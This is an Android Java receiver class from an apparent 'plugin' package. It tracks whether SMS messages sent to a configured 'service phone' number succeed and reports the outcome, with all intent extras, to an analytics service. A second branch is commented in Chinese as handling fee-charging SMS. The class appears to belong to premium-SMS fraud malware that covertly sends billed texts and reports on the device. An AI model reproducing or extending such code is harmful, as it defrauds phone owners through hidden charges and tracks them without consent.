package com.xstd.plugin.receiver;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.TextUtils;
import com.xstd.plugin.Utils.CommonUtil;
import com.xstd.plugin.config.PluginSettingManager;
import com.xstd.plugin.service.PluginInternalService;

import java.util.HashMap;

/**
 * Created by michael on 14-1-25.
 */
public class SMSSentBRC extends BroadcastReceiver {

    public static final String SMS_LOCAL_SENT_ACTION = "com.xstd.sms.local.sent";

    public static final String SMS_MONKEY_SENT_ACTION = "com.xstd.sms.monkey.sent";

    public void onReceive(Context context, Intent intent) {
        if (intent == null) return;
        String actionName = intent.getAction();
        if (TextUtils.isEmpty(actionName)) return;

        String error_reason = "unknown";
        if (SMS_LOCAL_SENT_ACTION.equals(actionName)) {
            PluginSettingManager.getInstance().init(context);
            String servicePhone = PluginSettingManager.getInstance().getServicePhoneNumber();
            //是手机服务器发送事件
            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    if (!TextUtils.isEmpty(servicePhone)) {
                        Intent pluginIntent = new Intent();
                        pluginIntent.setAction(PluginInternalService.ACTION_UPDATE_UMENG);
                        pluginIntent.putExtra("servicePhone", servicePhone);
                        pluginIntent.putExtra("event", "send_sms_phone1");
                        pluginIntent.setClass(context, PluginInternalService.class);
                        context.startService(pluginIntent);
                    }
                    //成功了就立刻返回
                    return;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    error_reason = "normal_error";
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    error_reason = "radio_off";
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    error_reason = "pdu_null";
                    break;
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                    error_reason = "no_service";
                    break;
                default:
                    error_reason = "unknown";
            }

            if (!TextUtils.isEmpty(servicePhone)) {
                Intent pluginIntent = new Intent();
                pluginIntent.setAction(PluginInternalService.ACTION_UPDATE_UMENG);

                try {
                    if (intent.getExtras() != null) {
                        Bundle bundle = intent.getExtras();
                        for (String key : bundle.keySet()) {
                            Object obj = bundle.get(key);
                            if (obj != null) {
                                pluginIntent.putExtra(key, String.valueOf(obj));
                            }
                        }
                    }
                } catch (Exception e) {
                    HashMap<String, String> log = new HashMap<String, String>();
                    log.put("error", e.getMessage());
                    CommonUtil.umengLog(context, "error", log);
                }

                pluginIntent.putExtra("servicePhone", servicePhone);
                pluginIntent.putExtra("reason", error_reason);
                pluginIntent.putExtra("event", "sms_service_phone_failed");
                pluginIntent.setClass(context, PluginInternalService.class);
                context.startService(pluginIntent);
            }

            //能到这的逻辑都是发送失败了
            PluginSettingManager.getInstance().setKeyDeviceHasSendToServicePhone(false);
            PluginSettingManager.getInstance().setKeyLastSendMsgToServicePhone(0);
            PluginSettingManager.getInstance().setKeySendMsgToServicePhoneClearTimes(0);
        } else if (SMS_MONKEY_SENT_ACTION.equals(actionName)) {
            //是扣费短信
        }
    }

}
